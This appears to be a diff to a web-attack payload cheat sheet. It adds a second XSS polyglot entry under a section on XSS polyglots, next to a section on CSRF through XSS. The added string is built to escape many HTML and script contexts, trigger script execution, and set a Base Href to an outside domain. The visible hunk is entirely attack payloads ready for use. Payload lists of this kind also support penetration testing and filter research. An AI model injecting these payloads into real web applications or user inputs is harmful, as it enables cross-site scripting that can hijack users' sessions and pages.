@@ -119,6 +119,9 @@ TABLE OF CONTENTS
         2.7 XSS POLYGLOT
                         2.7.1 [25]
                                 JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76->\
+
+                        2.7.2
+                                JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)("x2467")}//><Base/Href=//praetorian.com\76->\
         2.8 CSRF THROUGH XSS
                 2.8.1 [29]
                         <script>
